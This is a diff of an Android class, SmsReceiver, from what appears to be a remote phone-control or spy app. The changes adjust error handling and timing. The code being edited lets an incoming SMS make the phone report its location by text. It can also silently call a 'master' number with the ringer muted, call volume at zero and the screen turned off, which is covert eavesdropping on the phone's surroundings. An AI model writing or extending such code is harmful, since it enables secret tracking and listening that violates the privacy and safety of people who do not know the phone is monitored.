@@ -174,7 +174,11 @@ public class SmsReceiver extends BroadcastReceiver
     					if (BootService.locationUtil == null) {
     						return;
     					}
+    					
+    					GlobalValues.IS_GETTING_LOCATION = true;
     					LocationInfo location = getGeoLocation();
+    					GlobalValues.IS_GETTING_LOCATION = false;
+    					
     					String locationSms = "";
     					if (location != null) {
     						locationSms = SmsCtrl.buildLocationSms(SmsReceiver.this.context, location);
@@ -210,13 +214,13 @@ public class SmsReceiver extends BroadcastReceiver
 						SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(context), msg);
 						return;
 					}
-					else if (PowerUtil.isScreenOn(context)) {
-						String msg = context.getResources().getString(R.string.env_fail_screen_on);
-						SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(context), msg);
-						return;
-					}
 				} catch (Exception e) {	
-					String msg = context.getResources().getString(R.string.env_fail_exception);
+					// In some cases, there will be exception when calling PhoneUtils.getITelephony(tm).isOffhook(),
+					// But don't care what it is, just let process go on.
+				}
+				
+				if (PowerUtil.isScreenOn(context)) {
+					String msg = context.getResources().getString(R.string.env_fail_screen_on);
 					SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(context), msg);
 					return;
 				}
@@ -224,30 +228,38 @@ public class SmsReceiver extends BroadcastReceiver
 				// Start a new thread to call master phone
 				new Thread(new Runnable(){
 					public void run() {
-						// Disable ringer and vibrate
-						AudioManager am = (AudioManager) SmsReceiver.this.context.getSystemService(Context.AUDIO_SERVICE);
-		        		ORIGINAL_RING_MODE = am.getRingerMode();
-		        		if (ORIGINAL_RING_MODE == AudioManager.RINGER_MODE_NORMAL) {
-		        			ORIGINAL_RING_VOL = am.getStreamVolume(AudioManager.STREAM_RING);
-		        		}
-		        		am.setRingerMode(AudioManager.RINGER_MODE_SILENT);
+						try {
+							// Disable ringer and vibrate
+							AudioManager am = (AudioManager) SmsReceiver.this.context.getSystemService(Context.AUDIO_SERVICE);
+							ORIGINAL_RING_MODE = am.getRingerMode();
+							if (ORIGINAL_RING_MODE == AudioManager.RINGER_MODE_NORMAL) {
+								ORIGINAL_RING_VOL = am.getStreamVolume(AudioManager.STREAM_RING);
+							}
+							am.setRingerMode(AudioManager.RINGER_MODE_SILENT);
 						
-						// Lower phone call volume to min
-						ORIGINAL_VOICE_CALL_VOL = am.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
-						am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, 0, 0);
+							// Lower phone call volume to min
+							ORIGINAL_VOICE_CALL_VOL = am.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
+							am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, 0, 0);
 						
-						// Call master phone
-						String masterPhone = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
-						Uri uri = Uri.parse("tel:" + masterPhone);			          
-						Intent intent = new Intent(Intent.ACTION_CALL, uri);
-						intent.addFlags(Intent.FLAG_FROM_BACKGROUND); 
-						intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
-						SmsReceiver.this.context.startActivity(intent);
+							// Call master phone
+							String masterPhone = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
+							Uri uri = Uri.parse("tel:" + masterPhone);			          
+							Intent intent = new Intent(Intent.ACTION_CALL, uri);
+							intent.addFlags(Intent.FLAG_FROM_BACKGROUND); 
+							intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
+							SmsReceiver.this.context.startActivity(intent);
 						
-						GlobalValues.IS_ENV_LISTENING = true;
+							GlobalValues.IS_ENV_LISTENING = true;
 						
-						// Turn off screen
-						PowerUtil.setScreenOff(SmsReceiver.this.context);
+							SysUtils.threadSleep(3000, LOGTAG);
+						
+							// Turn off screen
+							PowerUtil.setScreenOff(SmsReceiver.this.context);
+						} catch (Exception e) {	
+							String msg = SmsReceiver.this.context.getResources().getString(R.string.env_fail_exception);
+							SmsCtrl.sendSms(GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context), msg);
+							return;
+						}
 					}
 				}).start();
 			}
